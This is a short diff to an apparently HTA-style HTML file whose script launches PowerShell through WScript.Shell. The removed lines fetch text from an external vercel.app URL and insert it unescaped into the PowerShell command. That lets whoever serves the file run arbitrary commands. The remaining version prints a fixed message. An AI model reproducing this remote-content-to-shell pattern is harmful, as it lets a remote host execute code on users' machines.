@@ -9,23 +9,10 @@
 </head>
 
 <script>
-  try {
-    var xhr = new ActiveXObject("MSXML2.XMLHTTP");
-    xhr.open("GET", "https://ea-kmu0lvz2l-bprogrimaingers-projects.vercel.app/message.txt", false);
-    xhr.send();
+  var shell = new ActiveXObject("WScript.Shell");
 
-    var msg = xhr.responseText || "Hi I am AI";
-
-    var shell = new ActiveXObject("WScript.Shell");
-
-    // FIXED QUOTES HERE
-    var command = 'powershell -NoExit -Command "Write-Host \\"' + msg + '\\""';
-    shell.Run(command);
-
-  } catch (e) {
-    var shell = new ActiveXObject("WScript.Shell");
-    shell.Run('powershell -NoExit -Command "Write-Host \\"Hi I am AI\\""');
-  }
+  var command = 'powershell -NoExit -Command "Write-Host \\"Hi I am AI\\""';
+  shell.Run(command);
 
   window.close();
 </script>
